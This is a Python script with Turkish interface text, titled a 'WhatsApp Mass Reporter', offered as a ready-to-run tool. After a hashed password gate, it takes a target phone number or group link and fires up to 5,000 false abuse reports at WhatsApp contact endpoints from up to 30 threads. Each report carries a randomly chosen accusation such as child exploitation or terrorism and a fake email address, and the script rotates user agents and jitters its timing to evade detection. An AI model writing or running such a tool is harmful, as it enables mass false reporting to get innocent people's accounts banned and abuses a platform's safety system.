#!/usr/bin/env python3
"""
KSIB TOOLS - WhatsApp Mass Reporter v4.0
KITA BAZLI ÜLKE SEÇİMİ | GİZLİ ŞİFRE
"""

import requests
import threading
import random
import time
import sys
import hashlib
import os
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

# Hash - şifre burada gözükmüyor!
KONTROL = "9e3f8a5c7d1b4e6f2a8c0d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + Style.BRIGHT + """
    ╔══════════════════════════════════════╗
    ║        🔐 KSIB GİRİŞ               ║
    ╚══════════════════════════════════════╝
    """ + Style.RESET_ALL)
    
    for i in range(3):
        s = input(Fore.YELLOW + "🔑 Şifre: ")
        if hashlib.sha256(s.encode()).hexdigest() == KONTROL:
            print(Fore.GREEN + "\n✅ Giriş başarılı! Program başlatılıyor...\n")
            time.sleep(1)
            return True
        print(Fore.RED + f"❌ Hatalı şifre! Kalan deneme: {2-i}\n")
    
    print(Fore.RED + "🚫 Çok fazla hatalı deneme! Program kapatılıyor...")
    time.sleep(2)
    sys.exit(0)

# KITALAR VE ÜLKELER
KITALAR = {
    "1": {
        "isim": "🌍 AFRİKA",
        "ulkeler": {
            "20": "Mısır 🇪🇬", "211": "Güney Sudan 🇸🇸", "212": "Fas 🇲🇦",
            "213": "Cezayir 🇩🇿", "216": "Tunus 🇹🇳", "218": "Libya 🇱🇾",
            "220": "Gambiya 🇬🇲", "221": "Senegal 🇸🇳", "222": "Moritanya 🇲🇷",
            "223": "Mali 🇲🇱", "224": "Gine 🇬🇳", "225": "Fildişi Sahili 🇨🇮",
            "226": "Burkina Faso 🇧🇫", "227": "Nijer 🇳🇪", "228": "Togo 🇹🇬",
            "229": "Benin 🇧🇯", "230": "Mauritius 🇲🇺", "231": "Liberya 🇱🇷",
            "232": "Sierra Leone 🇸🇱", "233": "Gana 🇬🇭", "234": "Nijerya 🇳🇬",
            "235": "Çad 🇹🇩", "236": "Orta Afrika 🇨🇫", "237": "Kamerun 🇨🇲",
            "238": "Yeşil Burun 🇨🇻", "239": "Sao Tome 🇸🇹", "240": "Ekvator Ginesi 🇬🇶",
            "241": "Gabon 🇬🇦", "242": "Kongo 🇨🇬", "243": "Dem. Kongo 🇨🇩",
            "244": "Angola 🇦🇴", "245": "Gine-Bissau 🇬🇼", "247": "Ascension 🇦🇨",
            "248": "Seyşeller 🇸🇨", "249": "Sudan 🇸🇩", "250": "Ruanda 🇷🇼",
            "251": "Etiyopya 🇪🇹", "252": "Somali 🇸🇴", "253": "Cibuti 🇩🇯",
            "254": "Kenya 🇰🇪", "255": "Tanzanya 🇹🇿", "256": "Uganda 🇺🇬",
            "257": "Burundi 🇧🇮", "258": "Mozambik 🇲🇿", "260": "Zambiya 🇿🇲",
            "261": "Madagaskar 🇲🇬", "263": "Zimbabve 🇿🇼", "264": "Namibya 🇳🇦",
            "265": "Malavi 🇲🇼", "266": "Lesoto 🇱🇸", "267": "Botsvana 🇧🇼",
            "268": "Esvatini 🇸🇿", "269": "Komorlar 🇰🇲", "27": "Güney Afrika 🇿🇦",
            "291": "Eritre 🇪🇷",
        }
    },
    "2": {
        "isim": "🌍 AVRUPA",
        "ulkeler": {
            "30": "Yunanistan 🇬🇷", "31": "Hollanda 🇳🇱", "32": "Belçika 🇧🇪",
            "33": "Fransa 🇫🇷", "34": "İspanya 🇪🇸", "351": "Portekiz 🇵🇹",
            "352": "Lüksemburg 🇱🇺", "353": "İrlanda 🇮🇪", "354": "İzlanda 🇮🇸",
            "355": "Arnavutluk 🇦🇱", "356": "Malta 🇲🇹", "357": "Kıbrıs 🇨🇾",
            "358": "Finlandiya 🇫🇮", "359": "Bulgaristan 🇧🇬", "36": "Macaristan 🇭🇺",
            "370": "Litvanya 🇱🇹", "371": "Letonya 🇱🇻", "372": "Estonya 🇪🇪",
            "373": "Moldova 🇲🇩", "375": "Belarus 🇧🇾", "380": "Ukrayna 🇺🇦",
            "381": "Sırbistan 🇷🇸", "382": "Karadağ 🇲🇪", "383": "Kosova 🇽🇰",
            "385": "Hırvatistan 🇭🇷", "386": "Slovenya 🇸🇮", "387": "Bosna Hersek 🇧🇦",
            "389": "Kuzey Makedonya 🇲🇰", "39": "İtalya 🇮🇹", "40": "Romanya 🇷🇴",
            "41": "İsviçre 🇨🇭", "420": "Çekya 🇨🇿", "421": "Slovakya 🇸🇰",
            "43": "Avusturya 🇦🇹", "44": "İngiltere 🇬🇧", "45": "Danimarka 🇩🇰",
            "46": "İsveç 🇸🇪", "47": "Norveç 🇳🇴", "48": "Polonya 🇵🇱",
            "49": "Almanya 🇩🇪",
        }
    },
    "3": {
        "isim": "🌏 ASYA & ORTA DOĞU",
        "ulkeler": {
            "81": "Japonya 🇯🇵", "82": "Güney Kore 🇰🇷", "84": "Vietnam 🇻🇳",
            "852": "Hong Kong 🇭🇰", "86": "Çin 🇨🇳", "880": "Bangladeş 🇧🇩",
            "886": "Tayvan 🇹🇼", "90": "Türkiye 🇹🇷", "91": "Hindistan 🇮🇳",
            "92": "Pakistan 🇵🇰", "93": "Afganistan 🇦🇫", "94": "Sri Lanka 🇱🇰",
            "95": "Myanmar 🇲🇲", "960": "Maldivler 🇲🇻", "961": "Lübnan 🇱🇧",
            "962": "Ürdün 🇯🇴", "963": "Suriye 🇸🇾", "964": "Irak 🇮🇶",
            "965": "Kuveyt 🇰🇼", "966": "Suudi Arabistan 🇸🇦", "967": "Yemen 🇾🇪",
            "968": "Umman 🇴🇲", "971": "BAE 🇦🇪", "972": "İsrail 🇮🇱",
            "973": "Bahreyn 🇧🇭", "974": "Katar 🇶🇦", "975": "Butan 🇧🇹",
            "976": "Moğolistan 🇲🇳", "977": "Nepal 🇳🇵", "98": "İran 🇮🇷",
            "992": "Tacikistan 🇹🇯", "993": "Türkmenistan 🇹🇲", "994": "Azerbaycan 🇦🇿",
            "995": "Gürcistan 🇬🇪", "996": "Kırgızistan 🇰🇬", "998": "Özbekistan 🇺🇿",
        }
    },
    "4": {
        "isim": "🌎 AMERİKA",
        "ulkeler": {
            "1": "ABD/Kanada 🇺🇸🇨🇦", "52": "Meksika 🇲🇽",
            "53": "Küba 🇨🇺", "54": "Arjantin 🇦🇷", "55": "Brezilya 🇧🇷",
            "56": "Şili 🇨🇱", "57": "Kolombiya 🇨🇴", "58": "Venezuela 🇻🇪",
            "501": "Belize 🇧🇿", "502": "Guatemala 🇬🇹", "503": "El Salvador 🇸🇻",
            "504": "Honduras 🇭🇳", "505": "Nikaragua 🇳🇮", "506": "Kosta Rika 🇨🇷",
            "507": "Panama 🇵🇦", "509": "Haiti 🇭🇹", "51": "Peru 🇵🇪",
            "591": "Bolivya 🇧🇴", "592": "Guyana 🇬🇾", "593": "Ekvador 🇪🇨",
            "595": "Paraguay 🇵🇾", "597": "Surinam 🇸🇷", "598": "Uruguay 🇺🇾",
        }
    },
    "5": {
        "isim": "🌏 OKYANUSYA",
        "ulkeler": {
            "61": "Avustralya 🇦🇺", "64": "Yeni Zelanda 🇳🇿",
            "673": "Brunei 🇧🇳", "674": "Nauru 🇳🇷", "675": "Papua Yeni Gine 🇵🇬",
            "676": "Tonga 🇹🇴", "677": "Solomon Adaları 🇸🇧", "678": "Vanuatu 🇻🇺",
            "679": "Fiji 🇫🇯", "680": "Palau 🇵🇼", "682": "Cook Adaları 🇨🇰",
            "685": "Samoa 🇼🇸", "686": "Kiribati 🇰🇮", "687": "Yeni Kaledonya 🇳🇨",
            "688": "Tuvalu 🇹🇻", "689": "Fransız Polinezyası 🇵🇫", "691": "Mikronezya 🇫🇲",
            "692": "Marshall Adaları 🇲🇭",
        }
    }
}

def ulke_sec():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + Style.BRIGHT + """
    ╔══════════════════════════════════════╗
    ║        🌍 KITA SEÇİMİ              ║
    ╚══════════════════════════════════════╝
    """ + Style.RESET_ALL)
    
    for kod, kita in KITALAR.items():
        print(Fore.YELLOW + f"[{kod}] {kita['isim']} ({len(kita['ulkeler'])} ülke)")
    
    print(Fore.CYAN + "\n[0] ✨ Direkt ülke kodu gir")
    
    kita_secim = input(Fore.GREEN + "\n🌍 Kıta seçin: ")
    
    if kita_secim == "0":
        return input(Fore.GREEN + "🔢 Ülke kodu (+ olmadan): ")
    
    if kita_secim not in KITALAR:
        print(Fore.RED + "❌ Geçersiz!")
        time.sleep(1)
        return ulke_sec()
    
    os.system('cls' if os.name == 'nt' else 'clear')
    kita = KITALAR[kita_secim]
    
    print(Fore.CYAN + f"\n{kita['isim']} ÜLKELERİ\n")
    
    ulkeler = list(kita['ulkeler'].items())
    for i, (kod, isim) in enumerate(ulkeler, 1):
        print(f"[{i:3d}] {isim:<30s} (+{kod})")
    
    try:
        secim = int(input(Fore.GREEN + f"\n🌍 Seç (1-{len(ulkeler)}): "))
        if 1 <= secim <= len(ulkeler):
            kod, isim = ulkeler[secim-1]
            print(Fore.GREEN + f"\n✅ {isim} (+{kod})")
            time.sleep(0.5)
            return kod
    except:
        pass
    
    return ulke_sec()

class WA:
    def __init__(self):
        self.ua = UserAgent()
        self.b = 0
        self.f = 0
        self.k = threading.Lock()
        self.st = None
        self.mx = 0
        self.s = 0
        self.ulke = "TR"
        self.r = ["spam", "harassment", "inappropriate_content", "fake_account", 
                  "scam", "fraud", "violence", "terrorism", "child_exploitation",
                  "drugs", "weapons", "hate_speech", "illegal_content", "other"]
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.GREEN + Style.BRIGHT + """
        ╔══════════════════════════════════════╗
        ║  WHATSAPP MASS REPORTER v4.0       ║
        ║  💬 Kıta Bazlı | 150+ Ülke        ║
        ╚══════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def oturum(self):
        s = requests.Session()
        s.headers.update({"User-Agent": self.ua.random})
        return s
    
    def rr(self):
        return random.choice(self.r)
    
    def gonder(self, t, tp, tid):
        s = self.oturum()
        while self.s < self.mx:
            r = self.rr()
            try:
                if tp in ["1", "3", "4"]:
                    u = "https://www.whatsapp.com/contact/nocontact"
                    d = {"phone_number": t, "violation": r, "email": f"x{random.randint(1000,9999)}@gmail.com", "country": self.ulke}
                else:
                    u = "https://www.whatsapp.com/contact/violation"
                    d = {"group_invite_link": t, "violation_type": r, "report_country": self.ulke}
                
                resp = s.post(u, data=d, timeout=15)
                rs = resp.status_code in [200, 201, 202, 302]
                
                with self.k:
                    if self.s >= self.mx: break
                    self.s += 1
                    if rs: self.b += 1
                    else: self.f += 1
                    if self.s % 25 == 0:
                        e = time.time() - self.st
                        rt = self.s / e if e > 0 else 0
                        print(f"\r✓ {self.s}/{self.mx} | ✅{self.b} ❌{self.f} | ⚡{rt:.1f}/s", end="")
                time.sleep(random.uniform(0.3, 0.8))
            except: continue
    
    def baslat(self, t, tp, c=100, th=30):
        self.mx = c
        print(Fore.CYAN + f"\n📱 Hedef: {t}")
        print(Fore.CYAN + f"🌍 Ülke: +{self.ulke} | 📊 Rapor: {c} | 🧵 Thread: {th}")
        print(Fore.RED + "\n💣 BAŞLATILIYOR...\n")
        self.st = time.time()
        tl = []
        for i in range(th):
            tr = threading.Thread(target=self.gonder, args=(t, tp, i))
            tr.daemon = True
            tr.start()
            tl.append(tr)
        try:
            for tr in tl: tr.join()
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Durduruldu!")
        self.sonuc()
    
    def sonuc(self):
        e = time.time() - self.st if self.st else 0
        t = self.b + self.f
        rt = t / e if e > 0 else 0
        print("\n\n" + "="*50)
        print(Fore.GREEN + "📊 SONUÇ")
        print("="*50)
        print(f"⏱️  Süre: {e:.1f}s | 📨 Toplam: {t}")
        print(f"✅ Başarılı: {self.b} | ❌ Başarısız: {self.f}")
        print(f"⚡ Hız: {rt:.1f}/s | ⏱️ {rt*60:.0f}/dk")
        print("="*50 + "\n")

def ana():
    giris()
    w = WA()
    w.bnr()
    
    print(Fore.YELLOW + "Rapor Tipi:")
    print("1. 👤 Bireysel\n2. 👥 Grup\n3. 🏢 Business\n4. 🔄 Karışık")
    tp = input(Fore.GREEN + "Seçim (1-4): ")
    
    if tp == "2":
        print(Fore.YELLOW + "\n🔗 Grup linki:")
        t = input(Fore.GREEN + "> ")
    else:
        w.ulke = ulke_sec()
        print(Fore.YELLOW + f"\n📱 Numara (+{w.ulke} için):")
        numara = input(Fore.GREEN + "> ")
        numara = ''.join(filter(str.isdigit, numara))
        if numara.startswith('0'): numara = numara[1:]
        t = w.ulke + numara
    
    print(Fore.YELLOW + "\n📊 Rapor: 1.100 2.500 3.1000 4.3000 5.5000")
    c = input(Fore.GREEN + "Seçim: ")
    ct = {"1": 100, "2": 500, "3": 1000, "4": 3000, "5": 5000}.get(c, 100)
    th = int(input(Fore.GREEN + "🧵 Thread (30): ") or "30")
    
    if input(Fore.RED + "\n⚠️ Devam? (E/H): ").upper() == 'E':
        w.baslat(t, tp, ct, th)

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Çıkış!")
        sys.exit(0)
